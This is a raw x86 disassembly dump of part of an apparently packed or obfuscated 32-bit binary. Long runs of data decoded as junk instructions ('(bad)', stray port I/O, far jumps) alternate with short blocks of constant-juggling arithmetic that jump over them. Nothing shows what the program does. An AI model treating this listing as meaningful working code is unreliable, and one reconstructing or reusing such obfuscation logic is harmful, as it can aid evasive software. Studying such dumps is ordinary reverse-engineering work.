  41216a:	sbb    DWORD PTR [edi],0x7efb3ecf
  412170:	and    BYTE PTR [edx-0x11],ch
  412173:	std    
  412174:	sbb    dh,BYTE PTR [edi+0x426b912c]
  41217a:	cdq    
  41217b:	js     0x412110
  41217d:	div    BYTE PTR [ecx-0x7250c767]
  412183:	fcomi  st,st(6)
  412185:	ds ja  0x4121ca
  412188:	fwait
  412189:	mov    dl,0x96
  41218b:	mov    cl,0x53
  41218d:	adc    eax,0x43d60616
  412192:	clc    
  412193:	xchg   ebx,eax
  412194:	mov    ch,0x4f
  412196:	xor    ch,BYTE PTR [edi+0x62]
  412199:	push   ebx
  41219a:	maskmovq mm5,(bad)
  41219b:	imul   DWORD PTR [edx-0x781a175d]
  4121a1:	scas   al,BYTE PTR es:[edi]
  4121a2:	outs   dx,DWORD PTR ds:[esi]
  4121a3:	stos   DWORD PTR es:[edi],eax
  4121a4:	and    eax,0x3282e0e0
  4121a9:	pop    ds
  4121aa:	mov    ebp,0xf8e943b7
  4121af:	int3   
  4121b0:	and    DWORD PTR [esi],0x410b572a
  4121b6:	xchg   esi,eax
  4121b7:	and    cl,BYTE PTR [ecx-0x67]
  4121ba:	ficom  WORD PTR [ebp-0x1f]
  4121bd:	xor    eax,DWORD PTR [edi-0x53]
  4121c0:	mov    dh,0x0
  4121c2:	inc    ebp
  4121c3:	jae    0x41223c
  4121c5:	and    eax,0xd8b3e882
  4121ca:	add    ah,dh
  4121cc:	push   eax
  4121cd:	rcl    BYTE PTR [ebp+0x13],0x46
  4121d1:	in     eax,0x12
  4121d3:	xor    dl,ch
  4121d5:	jp     0x4121ca
  4121d7:	pop    edx
  4121d8:	std    
  4121d9:	test   BYTE PTR [ebx+0x15],bh
  4121dc:	push   cs
  4121dd:	rol    DWORD PTR [esi+0x3c],cl
  4121e0:	(bad)  
  4121e1:	cld    
  4121e2:	in     eax,0x9e
  4121e4:	inc    edx
  4121e5:	adc    eax,DWORD PTR [ecx+0x27]
  4121e8:	dec    ecx
  4121e9:	adc    DWORD PTR [ebx-0x6744677b],edx
  4121ef:	lods   eax,DWORD PTR ds:[esi]
  4121f0:	fidiv  WORD PTR [ecx-0x72c74a0]
  4121f6:	add    BYTE PTR [ebx],dh
  4121f8:	jmp    0x3095904c
  4121fd:	pop    esi
  4121fe:	ds dec esi
  412200:	pop    ecx
  412201:	jno    0x4121e7
  412203:	pop    esp
  412204:	lods   al,BYTE PTR ds:[esi]
  412205:	sti    
  412206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412207:	and    eax,0x3ae059ba
  41220c:	push   eax
  41220d:	push   0xe4c37b20
  412212:	xor    eax,0x3884
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225fc
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	mov    eax,ds:0xfe6af6eb
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	pop    edi
  4122ae:	xchg   esp,eax
  4122af:	xchg   ebp,eax
  4122b0:	sub    BYTE PTR [ecx-0x1a24b338],ah
  4122b6:	pop    esi
  4122b7:	std    
  4122b8:	outs   dx,BYTE PTR ds:[esi]
  4122b9:	fwait
  4122ba:	mov    esp,0x35758086
  4122bf:	fiadd  WORD PTR [ebp-0x55]
  4122c2:	lods   al,BYTE PTR ds:[esi]
  4122c3:	(bad)  
  4122c4:	jne    0x4122cd
  4122c6:	mov    bh,bh
  4122c8:	neg    BYTE PTR [ebx+0x8fe224c]
  4122ce:	stc    
  4122cf:	sbb    al,BYTE PTR [ebp+0x6094201d]
  4122d5:	out    dx,eax
  4122d6:	sbb    ch,BYTE PTR [ecx-0x42deedcb]
  4122dc:	lock jl 0x412320
  4122df:	xchg   edx,eax
  4122e0:	sbb    BYTE PTR [esi-0x5465fefe],ah
  4122e6:	sbb    eax,0xd5e7b294
  4122eb:	fadd   QWORD PTR [eax]
  4122ed:	outs   dx,BYTE PTR ds:[esi]
  4122ee:	lahf   
  4122ef:	in     al,dx
  4122f0:	mov    ecx,0x4a4fd004
  4122f5:	jmp    0x412307
  4122f7:	into   
  4122f8:	rcr    DWORD PTR [ecx+0x14c35229],0x3a
  4122ff:	push   edx
  412300:	mov    ecx,0xecce25ab
  412305:	bnd jnp 0x41237e
  412308:	lock push edx
  41230a:	mov    BYTE PTR [esp+ebx*4+0x454f604e],cl
  412311:	hlt    
  412312:	push   ebp
  412313:	cmp    BYTE PTR [edx+0x25],0xaa
  412317:	ret    0x2916
  41231a:	adc    BYTE PTR [ecx],ch
  41231c:	lods   al,BYTE PTR ds:[esi]
  41231d:	mov    BYTE PTR [ebp-0x5129accc],al
  412323:	xchg   esp,eax
  412324:	sub    al,0x18
  412326:	pop    eax
  412327:	hlt    
  412328:	mov    esi,0xb17a747f
  41232d:	and    edi,DWORD PTR [edx+0x4e]
  412330:	stos   DWORD PTR es:[edi],eax
  412331:	test   al,0x33
  412333:	pop    ecx
  412334:	faddp  st(6),st
  412336:	jbe    0x4123a8
  412338:	je     0x4122c8
  41233a:	cs sbb eax,0xb4986dea
  412340:	pop    ds
  412341:	dec    eax
  412343:	mov    bl,BYTE PTR [esi+0x303bb1c8]
  412349:	mov    dl,0x36
  41234b:	std    
  41234c:	clc    
  41234d:	cmp    al,0x88
  41234f:	cmc    
  412350:	mov    ds:0xdba7d98f,eax
  412355:	gs rcr dh,0x44
  412359:	les    esp,FWORD PTR [esi]
  41235b:	test   esi,edi
  41235d:	mov    ds:0xfb8dde4f,eax
  412362:	xlat   BYTE PTR ds:[ebx]
  412363:	pop    ecx
  412364:	xor    BYTE PTR [edi],0x72
  412367:	je     0x4123d7
  412369:	loop   0x41232a
  41236b:	push   esi
  41236c:	ins    DWORD PTR es:[edi],dx
  41236d:	jo     0x4123b9
  41236f:	mov    esp,esp
  412371:	addr16 loopne 0x412366
  412374:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  412376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412377:	dec    esp
  412378:	and    dl,dl
  41237a:	mov    dl,0xe9
  41237c:	dec    ebp
  41237d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41237e:	jo     0x412357
  412380:	xor    BYTE PTR [ebx+0x14],dl
  412383:	inc    eax
  412384:	mov    ds:0x5b1a70f1,al
  412389:	or     cl,ch
  41238b:	pop    ebx
  41238c:	push   ss
  41238d:	or     BYTE PTR [eax-0x25],bh
  412390:	sar    eax,1
  412392:	test   eax,0x83dd9426
  412397:	imul   ebp,DWORD PTR [esi+eiz*1],0xb5509b02
  41239e:	sbb    eax,0x5c69ae89
  4123a3:	not    DWORD PTR [ebp-0x7f]
  4123a6:	sbb    al,0x68
  4123a8:	inc    esp
  4123a9:	js     0x412383
  4123ab:	pusha  
  4123ac:	(bad)  
  4123ae:	add    BYTE PTR [ecx],dh
  4123b0:	sbb    edi,DWORD PTR [ecx-0x6f]
  4123b3:	adc    al,0x5e
  4123b5:	stos   DWORD PTR es:[edi],eax
  4123b6:	mov    esi,0xc6553f9f
  4123bb:	jno    0x412410
  4123bd:	(bad)  
  4123be:	out    dx,eax
  4123bf:	test   eax,0x1d608cc6
  4123c4:	sub    edx,DWORD PTR [edx]
  4123c6:	mov    eax,0x46afd94d
  4123cb:	jg     0x4123ef
  4123cd:	mov    eax,0xc393aff3
  4123d2:	jns    0x41238f
  4123d4:	dec    esi
  4123d5:	jp     0x412421
  4123d7:	xor    edx,DWORD PTR [eax-0x29349c34]
  4123dd:	ret    
  4123de:	(bad)  
  4123e0:	je     0x412433
  4123e2:	scas   eax,DWORD PTR es:[edi]
  4123e3:	shl    DWORD PTR [eax],1
  4123e5:	fcmovnu st,st(4)
  4123e7:	clc    
  4123e8:	repz neg DWORD PTR [ebx+0x25d91d8c]
  4123ef:	ficom  WORD PTR [esi]
  4123f1:	aad    0x79
  4123f3:	cld    
  4123f4:	fild   WORD PTR [ecx]
  4123f6:	imul   eax,DWORD PTR [ebx],0xfdc68808
  4123fc:	in     eax,0x94
  4123fe:	pushf  
  4123ff:	dec    DWORD PTR [esi+0x3]
  412402:	sar    BYTE PTR [edx+0x5c0146e],1
  412408:	mov    ebp,DWORD PTR [ecx+0x1fbe19ac]
  41240e:	nop
  41240f:	test   al,al
  412411:	sti    
  412412:	dec    edi
  412413:	pop    DWORD PTR [edi-0x51]
  412416:	ins    BYTE PTR es:[edi],dx
  412417:	inc    ecx
  412418:	(bad)  
  412419:	rol    ah,cl
  41241b:	cli    
  41241c:	repz enter 0x3432,0x9b
  412421:	or     eax,0x83017f23
  412426:	xor    al,ah
  412428:	mov    esi,0xdbb677ab
  41242d:	sbb    ebp,DWORD PTR [ebp+0x340ac963]
  412433:	lds    edx,FWORD PTR ds:0xbf3b5d1a
  412439:	xchg   ebx,eax
  41243a:	test   al,0x6f
  41243c:	and    DWORD PTR [edx-0xe],edx
  41243f:	int    0x2d
  412441:	test   al,al
  412443:	aas    
  412444:	rcl    BYTE PTR [ebp-0x3f6c5cab],1
  41244a:	xor    eax,esi
  41244c:	mov    WORD PTR ds:0xd7d98c7d,cs
  412452:	xor    BYTE PTR [edx],dl
  412454:	mov    ds:0x53443a27,eax
  412459:	gs repz dec eax
  41245c:	add    cl,ch
  41245e:	adc    eax,DWORD PTR [edx-0x16]
  412461:	loop   0x412455
  412463:	pop    esp
  412464:	enter  0x8d78,0xb8
  412468:	or     DWORD PTR [esi-0x77],esi
  41246b:	inc    ebx
  41246c:	mov    eax,ds:0xf6949e62
  412471:	pop    es
  412472:	int    0x9c
  412474:	iret   
  412475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412476:	shl    ecx,cl
  412478:	popf   
  412479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41247a:	pop    ds
  41247b:	ror    eax,0x45
  41247e:	cwde   
  41247f:	mov    esi,0xfb5680c9
  412484:	mov    bl,0xc2
  412486:	or     DWORD PTR [ebp-0x41],0x79fcaadb
  41248d:	lods   al,BYTE PTR ds:[esi]
  41248e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41248f:	inc    eax
  412490:	cmc    
  412491:	pop    edx
  412492:	test   ah,bl
  412494:	or     DWORD PTR ds:0xcdefa224,eax
  41249a:	xor    DWORD PTR [ecx+0x41],edi
  41249d:	ins    DWORD PTR es:[edi],dx
  41249e:	in     al,0x50
  4124a0:	loopne 0x412454
  4124a2:	neg    BYTE PTR [ebx]
  4124a4:	int    0x97
  4124a6:	sbb    eax,DWORD PTR [ebx-0x1895178c]
  4124ac:	mov    ch,al
  4124ae:	adc    eax,0x3d356107
  4124b3:	ds scas al,BYTE PTR es:[edi]
  4124b5:	scas   al,BYTE PTR es:[edi]
  4124b6:	xchg   edi,eax
  4124b7:	cmp    esp,DWORD PTR [edi]
  4124b9:	jecxz  0x412539
  4124bb:	iret   
  4124bc:	outs   dx,DWORD PTR ds:[esi]
  4124bd:	or     cl,dh
  4124bf:	pop    ebp
  4124c0:	dec    edi
  4124c1:	jp     0x4124c5
  4124c3:	sti    
  4124c4:	cli    
  4124c5:	mov    edx,eax
  4124c7:	das    
  4124c8:	test   eax,0xfec91de7
  4124cd:	loopne 0x41252b
  4124cf:	lods   al,BYTE PTR ds:[esi]
  4124d0:	in     eax,0xf8
  4124d2:	mul    bh
  4124d4:	stos   BYTE PTR es:[edi],al
  4124d5:	jmp    0x840ed2d7
  4124da:	push   ebx
  4124db:	jne    0x412495
  4124dd:	das    
  4124de:	pop    edi
  4124df:	ret    
  4124e0:	retf   0x667f
  4124e3:	and    BYTE PTR [ebp+eax*8+0x26],dl
  4124e7:	neg    DWORD PTR [edi]
  4124e9:	mov    edx,DWORD PTR [eax+0xdd6e50]
  4124ef:	inc    ebp
  4124f0:	pushf  
  4124f1:	pop    ss
  4124f2:	sub    bl,dl
  4124f4:	xchg   edx,eax
  4124f5:	xchg   BYTE PTR [ebp+0x2dedfa8e],ch
  4124fb:	icebp  
  4124fc:	add    ch,dl
  4124fe:	mov    esp,0x6191207
  412503:	mov    ds:0x13d00324,al
  412508:	icebp  
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x422072
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4125ae
  412538:	sub    esp,0x185c57be
  41253e:	sbb    BYTE PTR [ecx+0x14],dh
  412541:	sbb    BYTE PTR [eax],bl
  412543:	dec    eax
  412544:	mov    esi,0x41bcf85b
  412549:	ss pop ebp
  41254b:	lods   eax,DWORD PTR ds:[esi]
  41254c:	and    ah,dl
  41254e:	imul   ebx,ecx,0xffffffb5
  412551:	adc    eax,0x391c481c
  412556:	xor    al,BYTE PTR [ebx+ecx*4]
  412559:	shl    ch,0xf2
  41255c:	fadd   QWORD PTR [edx]
  41255e:	mov    ds:0xd866cf59,eax
  412563:	stos   BYTE PTR es:[edi],al
  412564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412565:	push   0xc74eb05a
  41256a:	pop    edi
  41256b:	cmp    esi,esi
  41256d:	mov    dh,BYTE PTR [edx]
  41256f:	cwde   
  412570:	mov    al,0x57
  412572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412573:	and    eax,DWORD PTR [edi+0x10]
  412576:	cmp    DWORD PTR [eax+0x19],edi
  412579:	push   edi
  41257a:	data16 clc 
  41257c:	xchg   edi,eax
  41257d:	pop    ebp
  41257e:	xchg   esp,eax
  41257f:	(bad)  
  412580:	sub    dl,BYTE PTR [ecx+ebp*2]
  412583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412584:	xor    ah,BYTE PTR ds:0xa5975aa6
  41258a:	xchg   edi,eax
  41258b:	inc    eax
  41258c:	pop    es
  41258d:	lds    ebx,FWORD PTR [esi-0x7fdbb271]
  412593:	pushf  
  412594:	pop    ss
  412595:	pop    eax
  412596:	imul   ebx,DWORD PTR [esi+0x10],0xe45777ff
  41259d:	fisubr WORD PTR [eax-0x52]
  4125a0:	sub    bl,bh
  4125a2:	push   esp
  4125a3:	sti    
  4125a4:	in     eax,dx
  4125a5:	xchg   ebp,eax
  4125a6:	lahf   
  4125a7:	js     0x4125af
  4125a9:	mov    edi,esp
  4125ab:	push   ds
  4125ac:	or     BYTE PTR ds:0xeeb030a5,ch
  4125b2:	test   BYTE PTR [edi],0x15
  4125b5:	cs pop edx
  4125b7:	push   edi
  4125b8:	pusha  
  4125b9:	jmp    0x84748ee0
  4125be:	dec    eax
  4125bf:	pop    esp
  4125c0:	data16 das 
  4125c2:	or     ecx,eax
  4125c4:	scas   eax,DWORD PTR es:[edi]
  4125c5:	leave  
  4125c6:	jmp    0xf5c5a127
  4125cb:	or     al,bl
  4125cd:	clc    
  4125ce:	xor    ch,BYTE PTR [ebx+0x59]
  4125d1:	adc    DWORD PTR [esi+0x32bc1dc6],edx
  4125d7:	out    dx,eax
  4125d8:	dec    esi
  4125d9:	sub    al,0x24
  4125db:	xchg   DWORD PTR [ebx],edi
  4125dd:	and    eax,0x302a818e
  4125e2:	pop    es
  4125e3:	add    eax,0x6747bd8a
  4125e8:	adc    BYTE PTR [esi],bh
  4125ea:	xor    cl,BYTE PTR [ecx-0x12]
  4125ed:	sub    al,0xf
  4125ef:	xor    eax,0x5abb0799
  4125f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f5:	clc    
  4125f6:	adc    bh,BYTE PTR [ebx-0x36]
  4125f9:	xchg   ecx,eax
  4125fa:	out    0xda,eax
  4125fc:	sbb    esp,edi
  4125fe:	loope  0x4125ef
  412600:	xor    ecx,DWORD PTR [ebp-0x71]
  412603:	xchg   eax,esi
  412605:	pop    eax
  412606:	adc    eax,DWORD PTR ds:0xc2aaf891
  41260c:	hlt    
  41260d:	add    DWORD PTR [esi],eax
  41260f:	ds stc 
  412611:	inc    edx
  412612:	into   
  412613:	test   eax,0x3eb0033d
  412618:	aam    0xc0
  41261a:	mov    cs:0x39e20c77,eax
  412620:	sbb    dh,BYTE PTR [esp+eax*4+0x2c]
  412624:	loope  0x4125f0
  412626:	xchg   edx,eax
  412627:	pop    edi
  412628:	inc    edx
  412629:	test   DWORD PTR [ecx],esp
  41262b:	lods   eax,DWORD PTR ds:[esi]
  41262c:	cwde   
  41262d:	btc    DWORD PTR [eax+ebx*1-0x2a],0x5e
  412633:	pop    edi
  412634:	jbe    0x4125f8
  412636:	adc    eax,0xc52e16cf
  41263b:	push   es
  41263c:	cmp    ah,ah
  41263e:	js     0x4125c1
  412640:	xchg   ebp,eax
  412641:	xchg   DWORD PTR [eax+esi*4+0x3beb566d],ebx
  412648:	mov    esp,cs
  41264a:	ins    BYTE PTR es:[edi],dx
  41264b:	push   ebx
  41264c:	mov    bl,al
  41264e:	push   0x47
  412650:	adc    BYTE PTR [edx+0x60],ah
  412653:	retf   0x236f
  412656:	hlt    
  412657:	popf   
  412658:	sub    DWORD PTR [ebp+0x44],0xb05a1183
  41265f:	xor    eax,0xe221d820
  412664:	dec    esi
  412665:	mov    ebx,0x8ebc231f
  41266a:	dec    edi
  41266b:	(bad)  
  41266c:	imul   esi,DWORD PTR [esi-0x6d9a5299],0x988de17e
  412676:	or     ah,BYTE PTR [eax-0x148ae3c7]
  41267c:	lahf   
  41267d:	loop   0x412652
  41267f:	push   ss
  412680:	pop    ds
  412681:	ja     0x41262c
  412683:	push   cs
  412684:	add    BYTE PTR [ecx-0x33319678],dl
  41268a:	mov    ecx,0xe59fd00c
  41268f:	sbb    al,0xcc
  412691:	mov    ecx,DWORD PTR [edx-0x65]
  412694:	and    BYTE PTR [ecx+0x11],0xf8
  412698:	in     eax,0x2
  41269a:	leave  
  41269b:	sahf   
  41269c:	icebp  
  41269d:	mov    dl,dl
  41269f:	call   0x66c9:0xb33ba768
  4126a6:	in     eax,dx
  4126a7:	daa    
  4126a8:	push   ebx
  4126a9:	push   eax
  4126aa:	jmp    0xf635:0x3a76be49
  4126b1:	mov    al,ds:0x5a42fded
  4126b7:	jge    0x41268e
  4126b9:	mov    ds:0x4f78ad61,al
  4126be:	mov    ds:0xbc4bd29,al
  4126c3:	and    DWORD PTR [edx-0x6d],0x6bc4d50e
  4126ca:	cmp    BYTE PTR ss:[ecx-0x13c1bd91],0xda
  4126d2:	loope  0x41269f
  4126d4:	add    BYTE PTR [ebx-0x4af4e6f0],cl
  4126da:	(bad)  
  4126db:	and    DWORD PTR [edi+0x44ff2806],ebx
  4126e1:	mov    dl,0x2b
  4126e3:	adc    al,0x99
  4126e5:	push   ebp
  4126e6:	shl    dh,0x11
  4126e9:	fstp   QWORD PTR [edx]
  4126eb:	mov    dh,0x8b
  4126ed:	shl    ebx,0x76
  4126f0:	nop
  4126f1:	or     DWORD PTR [esi+edi*1],esp
  4126f4:	cmp    BYTE PTR [esi*1-0x4fabc705],ah
  4126fb:	jecxz  0x4126e7
  4126fd:	aaa    
  4126fe:	stos   DWORD PTR es:[edi],eax
  4126ff:	cmp    eax,0x25f16e5b
  412704:	(bad)  
  412705:	sub    eax,0xe27fa30
  41270a:	daa    
  41270b:	dec    edi
  41270c:	imul   ebx,DWORD PTR [ebx],0x20
  41270f:	fwait
  412710:	push   0x5cffaae2
  412715:	dec    edx
  412716:	jb     0x4126fd
  412718:	sar    DWORD PTR [ebx],cl
  41271a:	clc    
  41271b:	sbb    eax,0xeda85077
  412720:	nop
  412721:	cmp    DWORD PTR [edi+ebx*2+0x2c],eax
  412725:	push   ds
  412726:	mov    ch,0x49
  412728:	mov    bl,0x65
  41272a:	lods   al,BYTE PTR ds:[esi]
  41272b:	clc    
  41272c:	mov    eax,ds:0x2f4b0054
  412731:	add    eax,0xa0cb7438
  412736:	dec    ebx
  412737:	in     ax,0x6e
  41273a:	pop    edx
  41273b:	scas   eax,DWORD PTR es:[edi]
  41273c:	mov    eax,0xcc300e15
  412741:	out    dx,eax
  412742:	jmp    0x1d8b:0xba1d636a
  412749:	sbb    dh,BYTE PTR [esi*4+0x60b45c00]
  412750:	mov    esi,0x9a439627
  412755:	dec    esi
  412756:	push   es
  412757:	icebp  
  412758:	jne    0x4127b4
  41275a:	outs   dx,BYTE PTR ds:[esi]
  41275b:	fwait
  41275c:	adc    al,0x60
  41275e:	and    eax,DWORD PTR [ebx]
  412760:	sub    al,BYTE PTR [eax-0xdf6e58c]
  412766:	(bad)  
  412767:	mov    edi,0xb717283
  41276c:	shl    DWORD PTR [eax+ebp*2],cl
  41276f:	lods   eax,DWORD PTR ds:[esi]
  412770:	gs jl  0x412749
  412773:	lods   al,BYTE PTR ds:[esi]
  412774:	je     0x41272f
  412776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412777:	inc    ecx
  412778:	test   eax,0x5869d92c
  41277d:	push   edi
  41277e:	daa    
  41277f:	or     BYTE PTR [eax-0x1e71f888],dh
  412785:	xor    ebx,DWORD PTR [edx]
  412787:	and    eax,esp
  412789:	fldenv [esi+ebx*8]
  41278c:	mov    edx,0xa6c2690b
  412791:	mov    esp,0xc86e8a9b
  412796:	jl     0x412779
  412798:	pop    esi
  412799:	mov    esi,0x8bc21ba1
  41279e:	adc    eax,0x4225fc
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225fc
  4127d5:	mov    ds:0x422604,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x6a375a3f
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    bh,ah
  4128b3:	push   edx
  4128b4:	xchg   esi,eax
  4128b5:	es push eax
  4128b7:	inc    eax
  4128b8:	cmp    eax,0xbfc16a5e
  4128bd:	mov    ebp,DWORD PTR [ecx+0x287ff52e]
  4128c3:	mov    edi,0x2814dc1a
  4128c8:	iret   
  4128c9:	sbb    edx,DWORD PTR [ecx+edi*1]
  4128cc:	fld    TBYTE PTR [esi-0xe]
  4128cf:	bound  ebx,QWORD PTR [esi]
  4128d1:	or     DWORD PTR [eax+0x11],ebx
  4128d4:	cli    
  4128d5:	nop
  4128d6:	jb     0x4128b7
  4128d8:	jae    0x4128a7
  4128da:	dec    ebp
  4128db:	cmp    BYTE PTR [edi+ecx*4+0x24],ah
  4128df:	and    BYTE PTR [esi+0x1631deaa],bh
  4128e5:	lds    esi,FWORD PTR [eax]
  4128e7:	aas    
  4128e8:	lock push esi
  4128ea:	add    BYTE PTR [esi+0x3b],0x6e
  4128ee:	inc    esp
  4128ef:	enter  0xc6e1,0xb2
  4128f3:	jns    0x41291c
  4128f5:	adc    eax,0xcba982d6
  4128fa:	add    dh,BYTE PTR [ecx-0x5dda7a51]
  412900:	cmp    DWORD PTR [esi+0x4b],edx
  412903:	pop    es
  412904:	aam    0xfd
  412906:	pop    ds
  412907:	dec    esi
  412908:	lods   eax,DWORD PTR ds:[esi]
  412909:	cli    
  41290a:	in     al,0x89
  41290c:	pop    edx
  41290d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41290e:	push   ss
  41290f:	xchg   DWORD PTR [esi+0x765006e0],ecx
  412915:	inc    edi
  412916:	sub    bh,BYTE PTR [ebx+0x38d69578]
  41291c:	popa   
  41291d:	dec    ecx
  41291e:	and    BYTE PTR [ebx-0x446a33a5],dl
  412924:	inc    esp
  412925:	or     ah,BYTE PTR [ecx-0x66]
  412928:	xchg   esp,eax
  412929:	test   al,0x90
  41292b:	sub    ebx,0xd6e4a01e
  412931:	mov    al,ds:0x5dfb51c9
  412936:	pop    esi
  412937:	(bad)  
  412938:	sbb    BYTE PTR [eax-0x7ebfdc88],ah
  41293e:	adc    esi,DWORD PTR [ebx+0x29]
  412941:	cs into 
  412943:	ss aad 0x8
  412946:	cmp    eax,0x6653c627
  41294b:	or     BYTE PTR [ecx],dh
  41294d:	in     al,0xa6
  41294f:	push   es
  412950:	stos   BYTE PTR es:[edi],al
  412951:	sbb    dl,BYTE PTR [ebp-0x2b]
  412954:	cmp    bh,cl
  412956:	mov    eax,0x966200c6
  41295b:	ror    DWORD PTR [ecx],cl
  41295d:	iret   
  41295e:	sub    ah,bl
  412960:	pop    ebp
  412961:	test   al,0x8c
  412963:	cs jns 0x4129ac
  412966:	jg     0x41294a
  412968:	lock jecxz 0x412927
  41296b:	mov    edi,0xd9c2007b
  412970:	rol    BYTE PTR [ecx+0x46],0xa1
  412974:	sub    ecx,DWORD PTR [esi-0x34]
  412977:	bound  ecx,QWORD PTR [esi+eax*1-0x1e]
  41297b:	xchg   ebp,eax
  41297c:	push   ds
  41297d:	call   0x164a:0x7f787ede
  412984:	popa   
  412985:	into   
  412986:	xor    edi,DWORD PTR ds:0xeefa2aab
  41298c:	sub    al,0xdf
  41298e:	sub    al,0xc
  412990:	mov    ebx,0x85a28467
  412995:	in     al,dx
  412996:	pop    ds
  412997:	jmp    0xb928:0xc521fbe1
  41299e:	mov    esp,0x6e18e962
  4129a3:	sbb    bh,dl
  4129a5:	stos   DWORD PTR es:[edi],eax
  4129a6:	clc    
  4129a7:	push   0x9da41e97
  4129ac:	mov    ah,BYTE PTR [edx-0x72]
  4129af:	and    al,0xe2
  4129b1:	dec    edi
